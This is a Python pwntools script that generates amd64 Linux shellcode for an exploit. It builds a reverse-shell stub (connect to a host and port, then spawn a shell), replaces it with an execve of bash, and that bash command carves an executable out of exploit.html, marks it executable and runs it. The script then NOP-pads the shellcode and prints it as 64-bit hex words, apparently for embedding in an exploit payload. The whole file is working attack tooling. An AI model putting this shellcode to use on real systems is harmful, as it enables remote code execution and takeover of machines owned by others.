from pwn import *

context.arch = 'amd64'
HOST = '127.0.0.1'
PORT = 1337

sc_raw = ""
sc_raw += shellcraft.amd64.linux.connect(HOST, PORT)
sc_raw += shellcraft.amd64.linux.dupsh()

sc_raw = ""
path = '/bin/bash'
argv = ['bash', '-c', 'whoami && cd /tmp/exploit && (tail -n 23 exploit.html > exploit) && chmod +x exploit && ls -la && ./exploit']
sc_raw += shellcraft.amd64.linux.execve(path, argv)


sc = asm(sc_raw)
while len(sc) % 8 != 0:
    sc += b'\x90'
print(sc)
for i in range(0, len(sc), 8):
    print(hex(int.from_bytes(sc[i : i + 8], "little")) + 'n', ",", sep='')